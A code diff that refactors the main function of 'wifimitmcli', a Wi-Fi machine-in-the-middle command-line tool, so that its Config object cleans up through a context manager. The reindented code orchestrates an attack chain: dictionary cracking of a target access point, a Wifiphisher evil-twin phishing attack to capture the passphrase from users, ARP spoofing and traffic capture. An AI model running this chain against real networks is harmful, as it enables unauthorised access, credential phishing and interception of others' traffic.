@@ -76,163 +76,152 @@ def main():
     logging.captureWarnings(True)
     warnings.simplefilter('always', ResourceWarning)
 
-    config = Config()
-    config.parse_args()
-    if config.logging_level:
-        coloredlogs.install(level=config.logging_level)
-    else:
-        logging.disable(logging.CRITICAL)
-    logger.info('Config parsed from args.')
-    logger.debug(str(config))
-
-    logger.info('Check all requirements.')
-    try:
-        Requirements.check_all()
-    except RequirementError as e:
-        if isinstance(e.requirement, UidRequirement):
-            exitcode = ExitCode.EX_NOPERM
+    with Config() as config:
+        config.parse_args()
+        if config.logging_level:
+            coloredlogs.install(level=config.logging_level)
         else:
-            exitcode = ExitCode.EX_UNAVAILABLE
-        print(e.requirement.msg, file=sys.stderr)
-        print('Requirements check failed.', file=sys.stderr)
-        config.cleanup()
-        return exitcode.value
+            logging.disable(logging.CRITICAL)
+        logger.info('Config parsed from args.')
+        logger.debug(str(config))
 
-    # start successful
-    print(config.PROGRAM_DESCRIPTION)
-
-    interface = config.interface
-
-    with tempfile.TemporaryDirectory() as tmp_dirname:
+        logger.info('Check all requirements.')
         try:
-            interface.start_monitor_mode()
+            Requirements.check_all()
+        except RequirementError as e:
+            if isinstance(e.requirement, UidRequirement):
+                exitcode = ExitCode.EX_NOPERM
+            else:
+                exitcode = ExitCode.EX_UNAVAILABLE
+            print(e.requirement.msg, file=sys.stderr)
+            print('Requirements check failed.', file=sys.stderr)
+            return exitcode.value
 
-            scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface)
-            print('Scanning networks.')
-            scan = scanner.scan_once()
-        except KeyboardInterrupt:
-            print('Stopping.')
-            config.cleanup()
-            return ExitCode.KEYBOARD_INTERRUPT.value
-        finally:
-            if interface.monitor_mode:
-                interface.stop_monitor_mode()
+        # start successful
+        print(config.PROGRAM_DESCRIPTION)
 
-        target = None  # type: Optional[WirelessAccessPoint]
-        for ap in scan:
-            if ap.essid == config.essid:
-                target = ap
-                print("Target AP '{}' found.".format(target.essid))
-                logger.info("Target AP '{}' found.".format(target.essid))
-                break
+        interface = config.interface
 
-        if target:
-            print("Attack data stored at '{}'.".format(target.dir_path))
-
+        with tempfile.TemporaryDirectory() as tmp_dirname:
             try:
-                interface.start_monitor_mode(target.channel)
-                wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
-                print('Unlock targeted AP.')
-                wireless_unlocker.start()
-            except PassphraseNotInAnyDictionaryError:
-                print('Passphrase not in any dictionary.')
+                interface.start_monitor_mode()
+
+                scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface)
+                print('Scanning networks.')
+                scan = scanner.scan_once()
             except KeyboardInterrupt:
                 print('Stopping.')
-                config.cleanup()
                 return ExitCode.KEYBOARD_INTERRUPT.value
             finally:
                 if interface.monitor_mode:
                     interface.stop_monitor_mode()
 
-            if not (target.is_cracked() or 'OPN' in target.encryption):
-                if config.phishing_enabled:
-                    # try phishing attack to catch password from users
-                    print('Try to impersonate AP and perform a phishing attack.')
-                    try:
-                        print('Start wifiphisher.')
-                        with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
-                            while not wifiphisher.password:
-                                wifiphisher.update()
-                                if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
-                                    raise Wifiphisher.UnexpectedTerminationError()
-                                time.sleep(3)
+            target = None  # type: Optional[WirelessAccessPoint]
+            for ap in scan:
+                if ap.essid == config.essid:
+                    target = ap
+                    print("Target AP '{}' found.".format(target.essid))
+                    logger.info("Target AP '{}' found.".format(target.essid))
+                    break
 
-                            if not verify_psk(target, wifiphisher.password):
-                                print('Caught password is not correct.', file=sys.stderr)
-                                config.cleanup()
-                                return ExitCode.PHISHING_INCORRECT_PSK.value
-                    except KeyboardInterrupt:
-                        print('Stopping.')
-                        config.cleanup()
-                        return ExitCode.KEYBOARD_INTERRUPT.value
-                    except Wifiphisher.UnexpectedTerminationError:
-                        print('Wifiphisher unexpectedly terminated.', file=sys.stderr)
-                        config.cleanup()
-                        return ExitCode.SUBPROCESS_ERROR.value
-                else:
-                    print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
-                          'Attack unsuccessful.', file=sys.stderr)
-                    config.cleanup()
-                    return ExitCode.NOT_IN_ANY_DICTIONARY.value
+            if target:
+                print("Attack data stored at '{}'.".format(target.dir_path))
 
-            print('Targeted AP unlocked.')
-
-            # target unlocked, connect to the network
-
-            wireless_connecter = WirelessConnecter(interface=interface)
-            print('Connecting to the AP.')
-            try:
-                wireless_connecter.connect(target)
-            except subprocess.CalledProcessError:
-                logger.error('netctl unexpectedly terminated.')
-                print('netctl unexpectedly terminated.', file=sys.stderr)
-                config.cleanup()
-                return ExitCode.SUBPROCESS_ERROR.value
-            except KeyboardInterrupt:
-                print('Stopping.')
-                config.cleanup()
-                return ExitCode.KEYBOARD_INTERRUPT.value
-
-            print('Connection successful.')
-
-            # change the network topology
-
-            arp_spoofing = ArpSpoofing(interface=interface)
-            try:
-                print('Changing topology of network.')
-                arp_spoofing.start()
-                print('Running until KeyboardInterrupt.')
-                dumpcap = None
-                if config.capture_file:
-                    dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
-                    print('Capturing network traffic.')
                 try:
-                    while True:
-                        arp_spoofing.update_state()
-                        if dumpcap:
-                            dumpcap.update()
-                        time.sleep(1)
+                    interface.start_monitor_mode(target.channel)
+                    wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
+                    print('Unlock targeted AP.')
+                    wireless_unlocker.start()
+                except PassphraseNotInAnyDictionaryError:
+                    print('Passphrase not in any dictionary.')
+                except KeyboardInterrupt:
+                    print('Stopping.')
+                    return ExitCode.KEYBOARD_INTERRUPT.value
                 finally:
-                    if dumpcap:
-                        dumpcap.cleanup()
-            except KeyboardInterrupt:
-                print('Stopping.')
-            arp_spoofing.stop()
-            arp_spoofing.clean()
-            wireless_connecter.disconnect()
-        else:
-            print('Target AP not found during scan. Please make sure that you are within the signal reach of'
-                  ' the specified AP and try again.', file=sys.stderr)
-            logger.error('Target AP not found during scan. Please make sure that you are within the signal reach of'
-                         ' the specified AP and try again.')
-            config.cleanup()
-            return ExitCode.TARGET_AP_NOT_FOUND.value
+                    if interface.monitor_mode:
+                        interface.stop_monitor_mode()
 
-    config.cleanup()
+                if not (target.is_cracked() or 'OPN' in target.encryption):
+                    if config.phishing_enabled:
+                        # try phishing attack to catch password from users
+                        print('Try to impersonate AP and perform a phishing attack.')
+                        try:
+                            print('Start wifiphisher.')
+                            with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
+                                while not wifiphisher.password:
+                                    wifiphisher.update()
+                                    if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
+                                        raise Wifiphisher.UnexpectedTerminationError()
+                                    time.sleep(3)
+
+                                if not verify_psk(target, wifiphisher.password):
+                                    print('Caught password is not correct.', file=sys.stderr)
+                                    return ExitCode.PHISHING_INCORRECT_PSK.value
+                        except KeyboardInterrupt:
+                            print('Stopping.')
+                            return ExitCode.KEYBOARD_INTERRUPT.value
+                        except Wifiphisher.UnexpectedTerminationError:
+                            print('Wifiphisher unexpectedly terminated.', file=sys.stderr)
+                            return ExitCode.SUBPROCESS_ERROR.value
+                    else:
+                        print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
+                              'Attack unsuccessful.', file=sys.stderr)
+                        return ExitCode.NOT_IN_ANY_DICTIONARY.value
+
+                print('Targeted AP unlocked.')
+
+                # target unlocked, connect to the network
+
+                wireless_connecter = WirelessConnecter(interface=interface)
+                print('Connecting to the AP.')
+                try:
+                    wireless_connecter.connect(target)
+                except subprocess.CalledProcessError:
+                    logger.error('netctl unexpectedly terminated.')
+                    print('netctl unexpectedly terminated.', file=sys.stderr)
+                    return ExitCode.SUBPROCESS_ERROR.value
+                except KeyboardInterrupt:
+                    print('Stopping.')
+                    return ExitCode.KEYBOARD_INTERRUPT.value
+
+                print('Connection successful.')
+
+                # change the network topology
+
+                arp_spoofing = ArpSpoofing(interface=interface)
+                try:
+                    print('Changing topology of network.')
+                    arp_spoofing.start()
+                    print('Running until KeyboardInterrupt.')
+                    dumpcap = None
+                    if config.capture_file:
+                        dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
+                        print('Capturing network traffic.')
+                    try:
+                        while True:
+                            arp_spoofing.update_state()
+                            if dumpcap:
+                                dumpcap.update()
+                            time.sleep(1)
+                    finally:
+                        if dumpcap:
+                            dumpcap.cleanup()
+                except KeyboardInterrupt:
+                    print('Stopping.')
+                arp_spoofing.stop()
+                arp_spoofing.clean()
+                wireless_connecter.disconnect()
+            else:
+                print('Target AP not found during scan. Please make sure that you are within the signal reach of'
+                      ' the specified AP and try again.', file=sys.stderr)
+                logger.error('Target AP not found during scan. Please make sure that you are within the signal reach of'
+                             ' the specified AP and try again.')
+                return ExitCode.TARGET_AP_NOT_FOUND.value
+
     return ExitCode.EX_OK.value
 
 
-class Config:
+class Config(object):
     PROGRAM_NAME = 'wifimitmcli'
     PROGRAM_DESCRIPTION = 'Wi-Fi Machine-in-the-Middle command-line interface'
     LOGGING_LEVELS_DICT = {'debug': logging.DEBUG,
@@ -364,6 +353,11 @@ class Config:
         if self.capture_file:
             self.capture_file.close()
 
+    def __enter__(self):
+        return self
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        self.cleanup()
 
 if __name__ == '__main__':
     status = main()
